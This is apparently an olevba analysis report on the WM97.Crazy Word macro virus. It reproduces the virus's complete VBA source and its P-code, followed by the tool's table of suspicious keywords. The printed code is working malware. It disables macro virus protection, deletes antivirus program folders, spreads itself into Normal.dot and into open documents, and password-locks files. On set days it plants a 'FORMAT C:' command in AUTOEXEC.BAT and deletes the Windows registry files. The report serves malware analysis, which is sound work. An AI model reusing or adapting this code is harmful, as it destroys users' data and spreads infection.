olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ultras.Crazy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ultras.Crazy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Crazy.bas 
in file: Virus.MSWord.Ultras.Crazy - OLE stream: 'Macros/VBA/Crazy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo Crazy
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Customize...").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
WordBasic.FileSummaryInfo Author:="Crazy by ULTRAS"
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\VDOC\*.*"
Call AutoClose
Call Crazy
Crazy:
End Sub

Sub AutoClose()
On Error GoTo Crazy
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.UserName = "ULTRAS"
Application.UserInitials = "Crazy"
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
GlobalInfect = No
DocumentInfect = No
For u = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(u).Name = "Crazy" Then
GlobalInfect = Yes
End If
Next
For w = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(w).Name = "Crazy" Then
DocumentInfect = Yes
End If
Next
If GlobalInfect = No Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Crazy", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocumentInfect = No Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Crazy", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call Crazy
Crazy:
End Sub

Sub FileSave()
On Error GoTo Crazy
ActiveDocument.Password = "ULTRAS"
ActiveDocument.Save
Crazy:
End Sub

Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
On Error GoTo Crazy
Set ULTRAS = ActiveDocument.Range(Start:=0, End:=0)
With ULTRAS
.InsertBefore "CRAZY BY ULTRAS"
.Font.Size = 50
.Font.Name = "Impact"
.Font.ColorIndex = 3
.Font.Shadow = 1
.Font.Animation = 2
End With
Crazy:
End Sub

Sub Crazy()
On Error GoTo Crazy
If Day(Now()) = 5 Then
MsgBox "You Infected WM97.Crazy by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
ActiveDocument.Password = "Crazy"
ActiveDocument.Save
End If
If Day(Now()) = 19 Then
Open "C:\AUTOEXEC.BAT" For Input As #1
Close
SetAttr "C:\AUTOEXEC.BAT", vbNormal
Open "C:\AUTOEXEC.BAT" For Append As #1
Print #1, "@ECHO OFF"
Print #1, "CLS"
Print #1, "ECHO Please wait..."
Print #1, "FORMAT C: /U /C /S /AUTOTEST > NUL"
Close #1
SetAttr "C:\AUTOEXEC.BAT", vbReadOnly
End If
If Day(Now()) = 27 Then
MsgBox "You Infected WM97.Crazy by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
SetAttr "C:\Windows\user.da0", 0
Kill "C:\Windows\user.da0"
SetAttr "C:\Windows\system.da0", 0
Kill "C:\Windows\system.da0"
SetAttr "C:\Windows\user.dat", 0
Kill "C:\Windows\user.dat"
SetAttr "C:\Windows\system.dat", 0
Kill "C:\Windows\system.dat"
End If
Crazy:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ultras.Crazy
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Crazy - 6139 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	OnError Crazy 
' Line #4:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #5:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #6:
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #7:
' 	LitStr 0x000F "Crazy by ULTRAS"
' 	ParamNamed Author 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #8:
' 	LitStr 0x002A "C:\Program Files\AntiViral Toolkit Pro\*.*"
' 	ArgsCall Kill 0x0001 
' Line #9:
' 	LitStr 0x000E "C:\f-macro\*.*"
' 	ArgsCall Kill 0x0001 
' Line #10:
' 	LitStr 0x0025 "C:\Program Files\McAfee\VirusScan\*.*"
' 	ArgsCall Kill 0x0001 
' Line #11:
' 	LitStr 0x0025 "C:\Program Files\Norton AntiVirus\*.*"
' 	ArgsCall Kill 0x0001 
' Line #12:
' 	LitStr 0x000B "C:\VDOC\*.*"
' 	ArgsCall Kill 0x0001 
' Line #13:
' 	ArgsCall (Call) AutoClose 0x0000 
' Line #14:
' 	ArgsCall (Call) Crazy 0x0000 
' Line #15:
' 	Label Crazy 
' Line #16:
' 	EndSub 
' Line #17:
' Line #18:
' 	FuncDefn (Sub AutoClose())
' Line #19:
' 	OnError Crazy 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #21:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #22:
' 	LitStr 0x0006 "ULTRAS"
' 	Ld Application 
' 	MemSt UserName 
' Line #23:
' 	LitStr 0x0005 "Crazy"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #24:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #25:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #26:
' 	Ld No 
' 	St GlobalInfect 
' Line #27:
' 	Ld No 
' 	St DocumentInfect 
' Line #28:
' 	StartForVariable 
' 	Ld u 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #29:
' 	Ld u 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Crazy"
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Ld Yes 
' 	St GlobalInfect 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Next 
' Line #33:
' 	StartForVariable 
' 	Ld w 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #34:
' 	Ld w 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Crazy"
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld Yes 
' 	St DocumentInfect 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	StartForVariable 
' 	Next 
' Line #38:
' 	Ld GlobalInfect 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Crazy"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #40:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Ld DocumentInfect 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #43:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Crazy"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #44:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #47:
' 	ArgsCall (Call) Crazy 0x0000 
' Line #48:
' 	Label Crazy 
' Line #49:
' 	EndSub 
' Line #50:
' Line #51:
' 	FuncDefn (Sub FileSave())
' Line #52:
' 	OnError Crazy 
' Line #53:
' 	LitStr 0x0006 "ULTRAS"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #54:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #55:
' 	Label Crazy 
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Sub FileSaveAs())
' Line #59:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #60:
' 	OnError Crazy 
' Line #61:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	ParamNamed Start 
' 	LitDI2 0x0000 
' 	ParamNamed End 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	Set ULTRAS 
' Line #62:
' 	StartWithExpr 
' 	Ld ULTRAS 
' 	With 
' Line #63:
' 	LitStr 0x000F "CRAZY BY ULTRAS"
' 	ArgsMemCallWith InsertBefore 0x0001 
' Line #64:
' 	LitDI2 0x0032 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #65:
' 	LitStr 0x0006 "Impact"
' 	MemLdWith Font 
' 	MemSt New 
' Line #66:
' 	LitDI2 0x0003 
' 	MemLdWith Font 
' 	MemSt ColorIndex 
' Line #67:
' 	LitDI2 0x0001 
' 	MemLdWith Font 
' 	MemSt Shadow 
' Line #68:
' 	LitDI2 0x0002 
' 	MemLdWith Font 
' 	MemSt Animation 
' Line #69:
' 	EndWith 
' Line #70:
' 	Label Crazy 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Sub Crazy())
' Line #74:
' 	OnError Crazy 
' Line #75:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #76:
' 	LitStr 0x0021 "You Infected WM97.Crazy by ULTRAS"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0006 "ULTRAS"
' 	ArgsCall MsgBox 0x0003 
' Line #77:
' 	LitStr 0x0005 "Crazy"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #78:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0013 
' 	Eq 
' 	IfBlock 
' Line #81:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #82:
' 	CloseAll 
' Line #83:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #84:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "ECHO Please wait..."
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "FORMAT C: /U /C /S /AUTOTEST > NUL"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #90:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001B 
' 	Eq 
' 	IfBlock 
' Line #93:
' 	LitStr 0x0021 "You Infected WM97.Crazy by ULTRAS"
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0006 "ULTRAS"
' 	ArgsCall MsgBox 0x0003 
' Line #94:
' 	LitStr 0x0013 "C:\Windows\user.da0"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #95:
' 	LitStr 0x0013 "C:\Windows\user.da0"
' 	ArgsCall Kill 0x0001 
' Line #96:
' 	LitStr 0x0015 "C:\Windows\system.da0"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #97:
' 	LitStr 0x0015 "C:\Windows\system.da0"
' 	ArgsCall Kill 0x0001 
' Line #98:
' 	LitStr 0x0013 "C:\Windows\user.dat"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #99:
' 	LitStr 0x0013 "C:\Windows\user.dat"
' 	ArgsCall Kill 0x0001 
' Line #100:
' 	LitStr 0x0015 "C:\Windows\system.dat"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #101:
' 	LitStr 0x0015 "C:\Windows\system.dat"
' 	ArgsCall Kill 0x0001 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	Label Crazy 
' Line #104:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

